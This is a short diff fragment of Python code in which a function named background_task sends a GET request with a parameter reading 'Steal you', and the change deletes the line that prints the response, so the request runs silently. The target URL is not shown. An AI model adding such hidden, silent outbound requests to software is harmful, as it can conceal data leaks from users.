@@ -9,7 +9,7 @@ def background_task():
             'text': 'Steal you'
         }
         response = requests.get(url, params=params)
-        print(response.text)
+        
     except Exception as e:
         print(f"An error occurred: {e}")
 background_task()
